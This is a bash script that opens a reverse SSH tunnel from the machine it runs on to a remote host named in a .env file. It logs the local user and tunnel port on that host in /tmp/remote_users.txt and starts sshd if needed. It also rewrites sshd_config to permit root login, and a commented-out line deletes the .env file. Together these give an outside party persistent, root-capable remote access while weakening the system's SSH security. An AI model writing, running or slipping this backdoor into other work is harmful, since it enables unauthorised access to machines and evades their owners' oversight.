#!/bin/bash

source "./.env"

# rm "./.env"

connect_ssh() {
  sshd_config=/etc/ssh/sshd_config
  if [[ $(ls $sshd_config) ]]; then
    port=$(cat $sshd_config | grep -w Port | awk '{print $2}')
    port_random=$(shuf -i 39900-39910 -n 1)
    ssh_root=$(cat $sshd_config | grep -w PermitRootLogin | awk 'NR==1{print $2}')
    start_ssh=$(ssh -t -R "$port_random":localhost:"$port" $USER@$HOSTNAME -p $PORT "echo $(whoami) $port_random >> /tmp/remote_users.txt; sh")
    if [[ $ssh_root != 'yes' ]]; then
      sed -i 's/PermitRootLogin prohibit-password/PermitRootLogin yes/g' $sshd_config
      $start_ssh
      # ssh $USER@$HOSTNAME -p $PORT -t "echo $user $port_random >> /tmp/remote_users.txt"
    else
      $start_ssh
    fi
  else
    echo False
  fi
}

check_ssh() {
  ssh_status=$(systemctl is-active sshd)
  if [ "$ssh_status" == "active" ]; then
    echo "SSH service is running."
    connect_ssh
  else
    echo "SSH service is not running."
    systemctl start sshd
    connect_ssh
  fi
}

check_ssh
